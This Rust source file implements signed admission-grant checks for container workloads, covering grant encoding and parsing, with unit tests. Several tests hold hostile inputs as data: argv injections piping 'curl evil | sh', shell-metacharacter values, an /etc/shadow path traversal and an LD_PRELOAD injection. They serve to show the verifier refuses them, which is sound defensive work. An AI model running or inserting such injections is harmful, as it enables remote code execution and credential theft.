    // The nested-sandbox widening is never granted un-admitted, whatever the
    // node's policy — W235 §Reshaping's ordering constraint, enforced in code.
    //
    // Scoped to CONTAINER specs on purpose. The widening is an OCI capability
    // set, and a native (fork+exec) workload has no OCI spec to apply it to, so
    // a spec carrying both markers is asking for a privilege that cannot be
    // granted — an incoherent spec, not a privileged one. Kamaji already refuses
    // that pair with a message that says so (R577-T1 owns the refusal), and
    // "not admitted" would be a strictly less informative answer to the same
    // question. There is no privilege to protect here, so admission steps aside.
    //
    // R605-F8: a microVM workload is the same case for the same reason — it has
    // no OCI spec either, and `validate_microvm_spec` owns the matching refusal.
    // Note this arm is *not* a privilege relaxation: the guest has its own
    // kernel, so a capability set inside it grants nothing on the host.
    let widening =
        spec.wants_nested_sandbox() && !spec.wants_native_exec() && !spec.wants_microvm();
    let required = policy == Policy::Required || widening;

    if !present {
        return if required {
            Err(AdmissionError::GrantRequired {
                reason: if policy == Policy::Required {
                    format!("this node runs {POLICY_ENV}=required")
                } else {
                    format!(
                        "the workload requests the nested-sandbox widening (annotation {}={})",
                        crate::NESTED_SANDBOX_ANNOTATION,
                        crate::NESTED_SANDBOX_VALUE
                    )
                },
            })
        } else {
            Ok(None)
        };
    }

    let grant_text = spec
        .annotations
        .get(GRANT_ANNOTATION)
        .ok_or(AdmissionError::Incomplete {
            missing: GRANT_ANNOTATION,
        })?;
    let signature_hex =
        spec.annotations
            .get(GRANT_SIGNATURE_ANNOTATION)
            .ok_or(AdmissionError::Incomplete {
                missing: GRANT_SIGNATURE_ANNOTATION,
            })?;
    let key_hex = spec
        .annotations
        .get(GRANT_KEY_ANNOTATION)
        .ok_or(AdmissionError::Incomplete {
            missing: GRANT_KEY_ANNOTATION,
        })?;

    // 3. Attribution before crypto.
    if !trusted_keys.iter().any(|k| k == key_hex) {
        return Err(AdmissionError::UntrustedKey {
            key: key_hex.clone(),
        });
    }

    let key_bytes: [u8; 32] = hex::decode(key_hex)
        .ok()
        .and_then(|b| b.try_into().ok())
        .ok_or_else(|| AdmissionError::MalformedKey {
            reason: "expected 32 hex-encoded bytes".into(),
        })?;
    let verifying_key =
        VerifyingKey::from_bytes(&key_bytes).map_err(|e| AdmissionError::MalformedKey {
            reason: format!("not a valid Ed25519 point: {e}"),
        })?;
    let sig_bytes: [u8; 64] = hex::decode(signature_hex)
        .ok()
        .and_then(|b| b.try_into().ok())
        .ok_or_else(|| AdmissionError::MalformedSignature {
            reason: "expected 64 hex-encoded bytes".into(),
        })?;

    verifying_key
        .verify_strict(grant_text.as_bytes(), &Signature::from_bytes(&sig_bytes))
        .map_err(|_| AdmissionError::SignatureMismatch)?;

    // 5. Only now is the grant's content worth reading.
    let grant = AdmissionGrant::parse(grant_text)?;
    grant.covers(spec)?;
    Ok(Some(grant))
}

/// The signing key that vouched for a spec's grant, as it appears in
/// [`GRANT_KEY_ANNOTATION`]. Meaningful only alongside a grant returned by
/// [`admit_grant`] — on its own it is an unverified assertion.
pub fn grant_key(spec: &WorkloadSpec) -> Option<&String> {
    spec.annotations.get(GRANT_KEY_ANNOTATION)
}

/// The node's admission policy and pinned key set, read once from the
/// environment.
///
/// # Why this lives here rather than in kamaji
///
/// Two deployment shapes enforce admission — the standalone `kamaji.service`
/// (`kamaji-bin`) and the inlined `kamaji` library backends — and R592-T1 is on
/// record about what happens when those two grow their own copy of a shared
/// rule: they drift, and nobody notices until a node behaves differently from
/// the one next to it. This crate is the only thing both of them depend on
/// unconditionally, so the policy resolution lives here, resolved once per
/// process.
///
/// - `YAH_ADMISSION` — `disabled` | `permissive` | `required`. Unset means
///   [`Policy::Permissive`].
/// - `YAH_ADMISSION_KEYS` — comma-separated hex Ed25519 public keys. Unset
///   means none, which under `required` refuses everything.
///
/// **A malformed `YAH_ADMISSION` resolves to [`Policy::Required`]**, not to the
/// default. A typo in a security control must fail toward refusal; the
/// alternative is an operator who believes admission is on because they set the
/// variable, on a node that silently ignored it.
#[cfg(feature = "admission-verify")]
#[derive(Debug, Clone)]
pub struct NodeAdmission {
    /// How strictly this node enforces admission.
    pub policy: Policy,
    /// Hex Ed25519 public keys this node accepts grants from.
    pub trusted_keys: Vec<String>,
}

#[cfg(feature = "admission-verify")]
static NODE_ADMISSION: std::sync::OnceLock<NodeAdmission> = std::sync::OnceLock::new();

/// Environment variable naming this node's [`Policy`].
pub const POLICY_ENV: &str = "YAH_ADMISSION";

/// Environment variable carrying this node's comma-separated pinned keys.
pub const KEYS_ENV: &str = "YAH_ADMISSION_KEYS";

#[cfg(feature = "admission-verify")]
impl NodeAdmission {
    /// Resolve from the environment. Public for tests and for a node that wants
    /// to log its own posture at startup; [`check`] uses the cached form.
    pub fn from_env() -> Self {
        Self::from_vars(
            std::env::var(POLICY_ENV).ok().as_deref(),
            std::env::var(KEYS_ENV).ok().as_deref(),
        )
    }

    /// The pure half of [`Self::from_env`], so the fail-closed-on-typo rule is
    /// testable without mutating process environment.
    pub fn from_vars(policy: Option<&str>, keys: Option<&str>) -> Self {
        let policy = match policy {
            None => Policy::default(),
            Some(raw) => Policy::parse(raw).unwrap_or_else(|e| {
                eprintln!(
                    "{POLICY_ENV}: {e}. Falling back to \"required\" — a misconfigured \
                     admission control must refuse, not open."
                );
                Policy::Required
            }),
        };
        let trusted_keys = keys
            .unwrap_or_default()
            .split(',')
            .map(str::trim)
            .filter(|k| !k.is_empty())
            .map(str::to_string)
            .collect();
        Self {
            policy,
            trusted_keys,
        }
    }
}

/// Admit `spec` under this node's environment-resolved posture.
///
/// The one call every backend makes. See [`admit`] for the check order and
/// [`NodeAdmission`] for where the posture comes from.
#[cfg(feature = "admission-verify")]
pub fn check(spec: &WorkloadSpec) -> Result<(), AdmissionError> {
    check_grant(spec).map(|_| ())
}

/// [`check`], returning the verified grant — see [`admit_grant`] for why a
/// caller would want it.
#[cfg(feature = "admission-verify")]
pub fn check_grant(spec: &WorkloadSpec) -> Result<Option<AdmissionGrant>, AdmissionError> {
    let node = NODE_ADMISSION.get_or_init(NodeAdmission::from_env);
    admit_grant(spec, node.policy, &node.trusted_keys)
}

/// Sign an encoded grant, returning the hex signature to put in
/// [`GRANT_SIGNATURE_ANNOTATION`].
///
/// Lives beside [`admit`] on purpose: sign and verify must agree on the signed
/// bytes exactly, and the cheapest way to guarantee that is to give them no
/// opportunity to drift apart (`yah_plugin::sign_manifest` records the same
/// reasoning).
#[cfg(feature = "admission-verify")]
pub fn sign_grant(encoded_grant: &str, key: &ed25519_dalek::SigningKey) -> String {
    use ed25519_dalek::Signer;
    hex::encode(key.sign(encoded_grant.as_bytes()).to_bytes())
}

// ── errors ───────────────────────────────────────────────────────────────────

/// Why a grant document could not be read.
#[derive(Debug, Error, PartialEq, Eq)]
pub enum GrantError {
    #[error("admission grant does not open with {GRANT_MAGIC:?}")]
    BadMagic,
    #[error("admission grant: expected record {expected:?}, found {found:?}")]
    UnexpectedLabel { expected: &'static str, found: String },
    #[error("admission grant: record {label:?} is truncated or mis-lengthed")]
    Truncated { label: &'static str },
    #[error("admission grant: record {label:?} — {reason}")]
    BadValue { label: &'static str, reason: String },
    #[error("admission grant: {0} trailing byte(s) after the last record")]
    Trailing(usize),
}

/// Why a workload was not admitted.
#[derive(Debug, Error, PartialEq, Eq)]
pub enum AdmissionError {
    #[error(
        "workload carries no admission grant and one is required: {reason}. \
         Sign the recipe with `cargo xtask recipe-sign` (W235 §(c) / R555-F4)."
    )]
    GrantRequired { reason: String },
    #[error(
        "workload carries a partial admission grant — annotation {missing:?} is absent. \
         All three of the grant, its signature and its key must travel together."
    )]
    Incomplete { missing: &'static str },
    #[error(
        "admission grant is signed by {key}, which this node does not trust. \
         Pinned keys come from the {KEYS_ENV} environment variable."
    )]
    UntrustedKey { key: String },
    #[error("admission grant public key is malformed: {reason}")]
    MalformedKey { reason: String },
    #[error("admission grant signature is malformed: {reason}")]
    MalformedSignature { reason: String },
    #[error("admission grant signature does not verify over the grant it accompanies")]
    SignatureMismatch,
    #[error("admission grant does not cover this workload's {field}: {detail}")]
    Mismatch { field: &'static str, detail: String },
    #[error(transparent)]
    Grant(#[from] GrantError),
}

// ── encoding helpers ─────────────────────────────────────────────────────────

fn bool_str(b: bool) -> &'static str {
    if b {
        "true"
    } else {
        "false"
    }
}

fn record(out: &mut String, label: &str, value: &str) {
    out.push_str(label);
    out.push(' ');
    out.push_str(&value.len().to_string());
    out.push('\n');
    out.push_str(value);
    out.push('\n');
}

fn list(out: &mut String, label: &str, items: &[String]) {
    // The count is itself a length-prefixed record, so the parser has exactly
    // one record shape to read and a list header cannot be confused with a
    // scalar of the same label.
    record(out, label, &items.len().to_string());
    let item_label = format!("{label}.item");
    for item in items {
        record(out, &item_label, item);
    }
}

/// Lets `Option<String>` be encoded by the same counted-list record shape as a
/// genuine list, so the parser has one code path and the encoding stays
/// injective for the absent case.
trait AsSliceOfOne {
    fn as_slice_of_one(&self) -> &[String];
}

impl AsSliceOfOne for Option<String> {
    fn as_slice_of_one(&self) -> &[String] {
        match self {
            Some(s) => std::slice::from_ref(s),
            None => &[],
        }
    }
}

struct Cursor<'a> {
    rest: &'a str,
}

impl<'a> Cursor<'a> {
    fn new(text: &'a str) -> Self {
        Self { rest: text }
    }

    fn magic(&mut self) -> Result<(), GrantError> {
        let line = format!("{GRANT_MAGIC}\n");
        self.rest = self.rest.strip_prefix(&line).ok_or(GrantError::BadMagic)?;
        Ok(())
    }

    /// Read one `<label> <len>\n<value>\n` record, checking the label.
    fn record(&mut self, label: &'static str) -> Result<String, GrantError> {
        let (header, after) = self
            .rest
            .split_once('\n')
            .ok_or(GrantError::Truncated { label })?;
        let (found, len) = header
            .split_once(' ')
            .ok_or(GrantError::Truncated { label })?;
        if found != label {
            return Err(GrantError::UnexpectedLabel {
                expected: label,
                found: found.to_string(),
            });
        }
        let len: usize = len.parse().map_err(|_| GrantError::BadValue {
            label,
            reason: format!("length {len:?} is not a number"),
        })?;
        // Byte-indexed slicing: reject a length that lands inside a multi-byte
        // character rather than panicking on a non-char-boundary slice.
        if after.len() < len + 1 || !after.is_char_boundary(len) {
            return Err(GrantError::Truncated { label });
        }
        let (value, tail) = after.split_at(len);
        self.rest = tail.strip_prefix('\n').ok_or(GrantError::Truncated { label })?;
        Ok(value.to_string())
    }

    fn bool_record(&mut self, label: &'static str) -> Result<bool, GrantError> {
        match self.record(label)?.as_str() {
            "true" => Ok(true),
            "false" => Ok(false),
            other => Err(GrantError::BadValue {
                label,
                reason: format!("expected \"true\" or \"false\", got {other:?}"),
            }),
        }
    }

    /// Read the counted `secret` block: a count record, then four records per
    /// entry. Strict in the same way [`Cursor::record`] is — an unknown source
    /// kind, a non-octal mode or a relative mount path is an error, never a
    /// guess, because every one of them would otherwise widen what the signer
    /// believed they authorized.
    fn secrets(&mut self) -> Result<Vec<GrantSecret>, GrantError> {
        let count: usize = self.record("secret")?.parse().map_err(|_| GrantError::BadValue {
            label: "secret",
            reason: "count is not a number".into(),
        })?;
        if count > self.rest.len() {
            return Err(GrantError::BadValue {
                label: "secret",
                reason: format!("count {count} exceeds the remaining document"),
            });
        }
        let mut out = Vec::with_capacity(count);
        for _ in 0..count {
            let kind = self.record("secret.source-kind")?;
            let value = self.record("secret.source")?;
            let source = match kind.as_str() {
                "cluster" => SecretRef::Cluster { name: value },
                "local-file" => SecretRef::LocalFile {
                    path: PathBuf::from(value),
                },
                other => {
                    return Err(GrantError::BadValue {
                        label: "secret.source-kind",
                        reason: format!("expected \"cluster\" or \"local-file\", got {other:?}"),
                    })
                }
            };
            let path = PathBuf::from(self.record("secret.path")?);
            if !path.is_absolute() {
                return Err(GrantError::BadValue {
                    label: "secret.path",
                    reason: format!("mount path {} is not absolute", path.display()),
                });
            }
            let mode_raw = self.record("secret.mode")?;
            let mode = u32::from_str_radix(&mode_raw, 8).map_err(|_| GrantError::BadValue {
                label: "secret.mode",
                reason: format!("{mode_raw:?} is not an octal file mode"),
            })?;
            out.push(GrantSecret { source, path, mode });
        }
        Ok(out)
    }

    fn list(&mut self, label: &'static str) -> Result<Vec<String>, GrantError> {
        let count: usize = self.record(label)?.parse().map_err(|_| GrantError::BadValue {
            label,
            reason: "count is not a number".into(),
        })?;
        // A count larger than the remaining bytes can only be a malformed or
        // hostile document; refuse before allocating for it.
        if count > self.rest.len() {
            return Err(GrantError::BadValue {
                label,
                reason: format!("count {count} exceeds the remaining document"),
            });
        }
        // `record` takes a &'static str; the item label is derived, so this
        // leaks a small fixed set of strings (one per grant field) for the
        // process lifetime rather than per parse.
        let item_label: &'static str = match label {
            "workdir" => "workdir.item",
            "entrypoint" => "entrypoint.item",
            "argv" => "argv.item",
            "env-name" => "env-name.item",
            other => {
                return Err(GrantError::BadValue {
                    label,
                    reason: format!("{other:?} is not a list field"),
                })
            }
        };
        let mut items = Vec::with_capacity(count);
        for _ in 0..count {
            items.push(self.record(item_label)?);
        }
        Ok(items)
    }

    fn end(&self) -> Result<(), GrantError> {
        if self.rest.is_empty() {
            Ok(())
        } else {
            Err(GrantError::Trailing(self.rest.len()))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{EnvVar, ImageRef, MeshIdent, TierTag, VolumeMount};
    use std::path::PathBuf;

    const IMAGE: &str = "ghcr.io/yah-ai/rusty-v8-musl-builder";
    const DIGEST: &str = "sha256:8f2a6c1d6937e85ad7a1554829fb7901a7d204ed81e9ce7a1b53ef8c1acc1b75";

    fn image() -> ImageRef {
        ImageRef {
            registry: "ghcr.io".into(),
            repository: "yah-ai/rusty-v8-musl-builder".into(),
            tag: "v149.4.0".into(),
            digest: DIGEST.into(),
        }
    }

    /// The shape `velveteen_exec::remote::build_workload_spec` produces for a
    /// remotely-placed recipe step: forge defaults + host networking + the
    /// per-run durable produced mount.
    pub(super) fn forge_spec(argv: &[&str]) -> WorkloadSpec {
        let mut spec = WorkloadSpec::for_forge("abc123", image(), TierTag("infra".into()), vec![]);
        spec.command = Some(argv.iter().map(|s| s.to_string()).collect());
        spec.volumes.push(crate::forge_produced::durable_mount("abc123"));
        spec.annotations.insert(
            crate::HOST_NETWORK_ANNOTATION.into(),
            crate::HOST_NETWORK_VALUE.into(),
        );
        spec
    }

    /// The un-substituted spec a recipe author signs: same shape, argv holes
    /// intact.
    pub(super) fn template_spec() -> WorkloadSpec {
        forge_spec(&["build-v8.sh '{{target}}' '{{YAH_TRANSFORM_OUT}}'"])
    }

    /// What the reconciler actually dispatches after `substitute_argv`.
    pub(super) fn dispatched_spec() -> WorkloadSpec {
        forge_spec(&[
            "build-v8.sh 'x86_64-unknown-linux-musl' '/yah/produced/deadbeef.out'",
        ])
    }

    pub(super) fn grant() -> AdmissionGrant {
        AdmissionGrant::from_spec("rusty-v8-musl", &template_spec())
    }

    // ── secret fixtures (R555-F5) ────────────────────────────────────────────

    const R2_PATH: &str = "/run/yah/r2.json";

    fn cluster_mount(name: &str, path: &str, mode: u32) -> SecretMount {
        SecretMount {
            source: SecretRef::Cluster { name: name.into() },
            target: SecretTarget::File {
                path: PathBuf::from(path),
                mode,
            },
        }
    }

    /// A dispatched spec that declares one cluster secret, plus the grant cut
    /// from the matching template.
    fn spec_and_grant_with_a_secret() -> (WorkloadSpec, AdmissionGrant) {
        let mut template = template_spec();
        template.secrets.push(cluster_mount("r2-write", R2_PATH, 0o400));
        let grant = AdmissionGrant::from_spec("rusty-v8-musl", &template);
        let mut spec = dispatched_spec();
        spec.secrets.push(cluster_mount("r2-write", R2_PATH, 0o400));
        (spec, grant)
    }

    /// Reproduce what yubaba's `deploy::secret_mount::materialize_file_secrets`
    /// does to a spec before the backend — and therefore before kamaji's own
    /// admission check — sees it: the mount is gone and a read-only bind of the
    /// tmpfs file has taken its place.
    fn materialize(spec: &mut WorkloadSpec) {
        let ident = spec.expose.mesh.identity.0.clone();
        let mounts = std::mem::take(&mut spec.secrets);
        for m in mounts {
            let SecretTarget::File { path, .. } = &m.target else {
                spec.secrets.push(m);
                continue;
            };
            spec.volumes.push(VolumeMount {
                source: VolumeSource::Bind {
                    host_path: crate::secret_mount::materialized_host_path(
                        std::path::Path::new(crate::secret_mount::HOST_ROOT),
                        &ident,
                        path,
                    ),
                },
                target: path.clone(),
                read_only: true,
            });
        }
    }

    #[test]
    fn a_grant_carries_the_secrets_it_was_cut_from() {
        let (_, g) = spec_and_grant_with_a_secret();
        assert_eq!(
            g.secrets,
            vec![GrantSecret {
                source: SecretRef::Cluster {
                    name: "r2-write".into()
                },
                path: PathBuf::from(R2_PATH),
                mode: 0o400,
            }]
        );
        assert_eq!(AdmissionGrant::parse(&g.encode()).unwrap(), g);
    }

    #[test]
    fn several_secrets_round_trip_in_order() {
        let mut g = grant();
        g.secrets = vec![
            GrantSecret {
                source: SecretRef::Cluster {
                    name: "r2-write".into(),
                },
                path: PathBuf::from("/run/yah/r2.json"),
                mode: 0o400,
            },
            GrantSecret {
                source: SecretRef::LocalFile {
                    path: PathBuf::from("/var/lib/yah/yubaba/secrets/cosign"),
                },
                path: PathBuf::from("/run/yah/cosign.key"),
                mode: 0o400,
            },
        ];
        assert_eq!(AdmissionGrant::parse(&g.encode()).unwrap(), g);
    }

    /// Why the entry is four records instead of one joined string: joining
    /// needs a separator, and a separator occurring inside a secret name or a
    /// mount path makes two different allow-lists encode identically — which
    /// would mean a signature over one authorizing the other.
    #[test]
    fn two_different_allow_lists_cannot_encode_the_same() {
        let mut a = grant();
        a.secrets = vec![GrantSecret {
            source: SecretRef::Cluster {
                name: "r2 /run/yah/x".into(),
            },
            path: PathBuf::from("/run/yah/r2.json"),
            mode: 0o400,
        }];
        let mut b = grant();
        b.secrets = vec![GrantSecret {
            source: SecretRef::Cluster { name: "r2".into() },
            path: PathBuf::from("/run/yah/x /run/yah/r2.json"),
            mode: 0o400,
        }];
        assert_ne!(a.encode(), b.encode());
        assert_eq!(AdmissionGrant::parse(&a.encode()).unwrap(), a);
        assert_eq!(AdmissionGrant::parse(&b.encode()).unwrap(), b);
    }

    #[test]
    fn parse_refuses_a_malformed_secret_entry() {
        let g = {
            let (_, g) = spec_and_grant_with_a_secret();
            g
        };
        let encoded = g.encode();

        // A source kind the verifier does not know is an error, not a guess.
        let bad_kind = encoded.replacen("cluster\n", "vault\n", 1);
        assert!(matches!(
            AdmissionGrant::parse(&bad_kind).unwrap_err(),
            GrantError::BadValue {
                label: "secret.source-kind",
                ..
            } | GrantError::Truncated { .. }
        ));

        // A relative mount path would resolve against the container's workdir,
        // so what the signer authorized would depend on a field the grant
        // template-matches rather than compares.
        let relative = encoded.replacen(
            &format!("secret.path {}\n{R2_PATH}", R2_PATH.len()),
            "secret.path 8\nr2.json ",
            1,
        );
        assert!(AdmissionGrant::parse(&relative).is_err());
    }

    #[test]
    fn a_declared_secret_is_admitted() {
        let (spec, g) = spec_and_grant_with_a_secret();
        g.covers(&spec).unwrap();
    }

    #[test]
    fn a_secret_the_grant_does_not_admit_is_refused() {
        let mut spec = dispatched_spec();
        spec.secrets.push(cluster_mount("r2-write", R2_PATH, 0o400));
        let err = grant().covers(&spec).unwrap_err();
        assert!(
            matches!(&err, AdmissionError::Mismatch { field: "secrets", .. }),
            "{err}"
        );
    }

    /// The headline hole R555-F5 exists to close: the argv, the image and the
    /// env NAMES all still match the signature, and only the credential the run
    /// reads has been swapped.
    #[test]
    fn swapping_the_credential_under_an_admitted_mount_is_refused() {
        let (mut spec, g) = spec_and_grant_with_a_secret();
        spec.secrets = vec![cluster_mount("cosign-signing-key", R2_PATH, 0o400)];
        let err = g.covers(&spec).unwrap_err();
        assert!(
            matches!(&err, AdmissionError::Mismatch { field: "secrets", .. }),
            "{err}"
        );
        assert!(err.to_string().contains("cosign-signing-key"), "{err}");
    }

    /// Mode is in the signed body, so widening it is a different grant.
    #[test]
    fn loosening_the_file_mode_is_refused() {
        let (mut spec, g) = spec_and_grant_with_a_secret();
        spec.secrets = vec![cluster_mount("r2-write", R2_PATH, 0o444)];
        assert!(g.covers(&spec).is_err());
    }

    #[test]
    fn an_env_target_secret_mount_is_refused_rather_than_admitted() {
        let env_mount = SecretMount {
            source: SecretRef::Cluster {
                name: "r2-write".into(),
            },
            target: SecretTarget::EnvVar {
                name: "R2_TOKEN".into(),
            },
        };
        let mut template = template_spec();
        template.secrets.push(env_mount.clone());
        // Signing one produces a grant that does not cover it, so the refusal
        // is reachable at signing time and not only on the node.
        let g = AdmissionGrant::from_spec("rusty-v8-musl", &template);
        assert!(g.secrets.is_empty());

        let mut spec = dispatched_spec();
        spec.secrets.push(env_mount);
        let err = g.covers(&spec).unwrap_err();
        assert!(
            matches!(&err, AdmissionError::Mismatch { field: "secrets", .. }),
            "{err}"
        );
    }

    /// The second half of the same hole: `env_names` admits `R2_TOKEN`, and the
    /// VALUE selects which secret is read.
    #[test]
    fn an_env_var_resolved_from_a_secret_is_refused_even_when_its_name_is_admitted() {
        let mut template = template_spec();
        template.env.push(EnvVar {
            name: "R2_TOKEN".into(),
            value: EnvValue::Literal {
                value: "placeholder".into(),
            },
        });
        let g = AdmissionGrant::from_spec("rusty-v8-musl", &template);
        assert!(g.env_names.contains(&"R2_TOKEN".to_string()));

        let mut spec = dispatched_spec();
        spec.env = vec![EnvVar {
            name: "R2_TOKEN".into(),
            value: EnvValue::FromSecret {
                secret: "cosign-signing-key".into(),
                key: "seed".into(),
            },
        }];
        let err = g.covers(&spec).unwrap_err();
        assert!(matches!(&err, AdmissionError::Mismatch { field: "env", .. }), "{err}");
        assert!(err.to_string().contains("cosign-signing-key"), "{err}");
    }

    // ── the yubaba rewrite (R555-F5) ─────────────────────────────────────────

    /// kamaji checks the spec AFTER yubaba has turned the mount into a bind.
    /// Without this, a signed recipe that uses a secret is refused by the bind
    /// rule with a message about a forge state root it never asked for.
    #[test]
    fn the_materialized_bind_yubaba_injects_is_admitted() {
        let (mut spec, g) = spec_and_grant_with_a_secret();
        materialize(&mut spec);
        assert!(spec.secrets.is_empty(), "materialization consumes the mount");
        assert_eq!(spec.volumes.len(), 2, "produced dir + the secret bind");
        g.covers(&spec).unwrap();
    }

    #[test]
    fn a_materialized_bind_for_another_workloads_ident_is_refused() {
        let (mut spec, g) = spec_and_grant_with_a_secret();
        materialize(&mut spec);
        // Same container path, same grant — but the host file belongs to the
        // ingress workload's secret dir.
        for v in &mut spec.volumes {
            if let VolumeSource::Bind { host_path } = &mut v.source {
                if host_path.starts_with(crate::secret_mount::HOST_ROOT) {
                    *host_path = crate::secret_mount::materialized_host_path(
                        std::path::Path::new(crate::secret_mount::HOST_ROOT),
                        "ingress",
                        std::path::Path::new(R2_PATH),
                    );
                }
            }
        }
        let err = g.covers(&spec).unwrap_err();
        assert!(
            matches!(&err, AdmissionError::Mismatch { field: "volumes", .. }),
            "{err}"
        );
    }

    #[test]
    fn a_writable_bind_at_an_admitted_secret_path_is_refused() {
        let (mut spec, g) = spec_and_grant_with_a_secret();
        materialize(&mut spec);
        for v in &mut spec.volumes {
            if v.target == PathBuf::from(R2_PATH) {
                v.read_only = false;
            }
        }
        assert!(g.covers(&spec).is_err());
    }

    #[test]
    fn a_secret_bind_the_grant_never_admitted_is_refused() {
        let mut spec = dispatched_spec();
        let ident = spec.expose.mesh.identity.0.clone();
        spec.volumes.push(VolumeMount {
            source: VolumeSource::Bind {
                host_path: crate::secret_mount::materialized_host_path(
                    std::path::Path::new(crate::secret_mount::HOST_ROOT),
                    &ident,
                    std::path::Path::new(R2_PATH),
                ),
            },
            target: PathBuf::from(R2_PATH),
            read_only: true,
        });
        // The grant here declares no secrets at all: the exemption is keyed on
        // the allow-list, not on the path shape.
        assert!(grant().covers(&spec).is_err());
    }

    // ── encoding ─────────────────────────────────────────────────────────────

    #[test]
    fn encode_parse_round_trips() {
        let g = grant();
        assert_eq!(AdmissionGrant::parse(&g.encode()).unwrap(), g);
    }

    #[test]
    fn encode_survives_a_value_containing_a_newline() {
        // A `bash -c` recipe step routinely embeds one; the length prefix is
        // what makes that need no escaping.
        let mut g = grant();
        g.argv = vec!["bash".into(), "-c".into(), "set -e\necho hi\n".into()];
        assert_eq!(AdmissionGrant::parse(&g.encode()).unwrap(), g);
    }

    #[test]
    fn absent_workdir_round_trips_distinctly_from_an_empty_one() {
        let mut absent = grant();
        absent.workdir = None;
        let mut empty = grant();
        empty.workdir = Some(String::new());
        assert_ne!(absent.encode(), empty.encode());
        assert_eq!(AdmissionGrant::parse(&absent.encode()).unwrap(), absent);
        assert_eq!(AdmissionGrant::parse(&empty.encode()).unwrap(), empty);
    }

    #[test]
    fn parse_rejects_a_foreign_document() {
        assert_eq!(
            AdmissionGrant::parse("yah-admission-grant/v3\n").unwrap_err(),
            GrantError::BadMagic
        );
    }

    /// R555-F5 bumped the format to v2 (the `secret` allow-list). A v1 document
    /// must be refused at the magic line — the version skew is the whole reason
    /// the magic doubles as a version, and "refuses loudly" is the only safe
    /// answer when the missing field is the one that says what may be read.
    #[test]
    fn a_v1_grant_is_refused_rather_than_read_as_granting_no_secrets() {
        let v1 = grant().encode().replacen(GRANT_MAGIC, "yah-admission-grant/v1", 1);
        assert_eq!(AdmissionGrant::parse(&v1).unwrap_err(), GrantError::BadMagic);
    }

    #[test]
    fn parse_rejects_trailing_bytes() {
        let text = format!("{}{}", grant().encode(), "extra");
        assert!(matches!(
            AdmissionGrant::parse(&text).unwrap_err(),
            GrantError::Trailing(5)
        ));
    }

    #[test]
    fn parse_rejects_a_reordered_record() {
        let text = grant().encode().replacen("recipe ", "tier ", 1);
        assert!(matches!(
            AdmissionGrant::parse(&text).unwrap_err(),
            GrantError::UnexpectedLabel { .. }
        ));
    }

    #[test]
    fn parse_rejects_a_length_that_does_not_match_its_value() {
        let text = grant().encode().replacen("recipe 13\n", "recipe 99\n", 1);
        assert!(matches!(
            AdmissionGrant::parse(&text).unwrap_err(),
            GrantError::Truncated { .. }
        ));
    }

    // ── template matching ────────────────────────────────────────────────────

    #[test]
    fn a_template_without_holes_is_compared_verbatim() {
        assert!(template_matches("/app/quantize", "/app/quantize"));
        assert!(!template_matches("/app/quantize", "/app/quantize2"));
    }

    #[test]
    fn holes_accept_the_values_the_materialize_path_substitutes() {
        assert!(template_matches(
            "build-v8.sh '{{target}}' '{{YAH_TRANSFORM_OUT}}'",
            "build-v8.sh 'x86_64-unknown-linux-musl' '/yah/produced/deadbeef.out'",
        ));
    }

    #[test]
    fn a_hole_may_not_break_out_of_the_quoting_the_recipe_wrote() {
        // The whole security argument for matching templates rather than
        // literals: a param that closes the author's quote and appends a
        // command must not be an instantiation of the template.
        assert!(!template_matches(
            "build-v8.sh '{{target}}' '{{YAH_TRANSFORM_OUT}}'",
            "build-v8.sh 'x86'; curl evil | sh; echo '' '/yah/produced/a.out'",
        ));
        for hostile in [
            "a$(id)b", "a`id`b", "a;id", "a|id", "a&id", "a>f", "a<f", "a\\b", "a\nb",
        ] {
            assert!(!hole_is_safe(hostile), "{hostile:?} must not be a safe hole");
        }
    }

    #[test]
    fn a_hole_may_not_traverse_out_of_the_directory_it_names() {
        assert!(!template_matches(
            "cp '{{YAH_TRANSFORM_OUT}}'",
            "cp '/yah/produced/../../etc/shadow'",
        ));
    }

    #[test]
    fn a_trailing_hole_consumes_the_rest() {
        assert!(template_matches("prefix-{{x}}", "prefix-value"));
        assert!(!template_matches("prefix-{{x}}", "nope-value"));
        assert!(!template_matches("prefix-{{x}}", "prefix-va;lue"));
    }

    #[test]
    fn an_unterminated_placeholder_is_literal_text() {
        // Mirrors `substitute_argv`, which preserves an unterminated `{{`
        // verbatim — so a template containing one is compared verbatim too.
        assert!(template_matches("echo {{oops", "echo {{oops"));
        assert!(!template_matches("echo {{oops", "echo anything"));
    }

    // ── coverage ─────────────────────────────────────────────────────────────

    #[test]
    fn a_grant_covers_the_dispatch_it_was_cut_for() {
        grant().covers(&dispatched_spec()).unwrap();
    }

    #[test]
    fn a_swapped_image_is_not_covered() {
        let mut spec = dispatched_spec();
        spec.image.digest = format!("sha256:{}", "0".repeat(64));
        assert!(matches!(
            grant().covers(&spec).unwrap_err(),
            AdmissionError::Mismatch { field: "image", .. }
        ));
    }

    #[test]
    fn a_swapped_tag_on_the_same_digest_is_not_covered() {
        // The digest is the identity, but the tag rides in the payload too:
        // re-tagging is a provenance change the grant's author did not sign.
        let mut spec = dispatched_spec();
        spec.image.tag = "latest".into();
        assert!(matches!(
            grant().covers(&spec).unwrap_err(),
            AdmissionError::Mismatch { field: "image", .. }
        ));
    }

    #[test]
    fn an_appended_argv_element_is_not_covered() {
        let mut spec = dispatched_spec();
        spec.command.as_mut().unwrap().push("; curl evil | sh".into());
        assert!(matches!(
            grant().covers(&spec).unwrap_err(),
            AdmissionError::Mismatch { field: "argv", .. }
        ));
    }

    #[test]
    fn a_rewritten_argv_literal_is_not_covered() {
        let spec = forge_spec(&["evil.sh 'x86_64-unknown-linux-musl' '/yah/produced/a.out'"]);
        assert!(matches!(
            grant().covers(&spec).unwrap_err(),
            AdmissionError::Mismatch { field: "argv", .. }
        ));
    }

    #[test]
    fn an_unlisted_env_var_is_not_covered() {
        // LD_PRELOAD is code injection that touches neither image nor argv,
        // which is exactly why env names are in the payload.
        let mut spec = dispatched_spec();
        spec.env.push(EnvVar {
            name: "LD_PRELOAD".into(),
            value: EnvValue::Literal {
                value: "/tmp/evil.so".into(),
            },
        });
        assert!(matches!(
            grant().covers(&spec).unwrap_err(),
            AdmissionError::Mismatch { field: "env", .. }
        ));
    }

    #[test]
    fn a_listed_env_var_is_covered_whatever_its_value() {
        let mut template = template_spec();
        template.env.push(EnvVar {
            name: "YAH_PRODUCED_DIR".into(),
            value: EnvValue::Literal { value: "".into() },
        });
        let g = AdmissionGrant::from_spec("r", &template);
        let mut spec = dispatched_spec();
        spec.env.push(EnvVar {
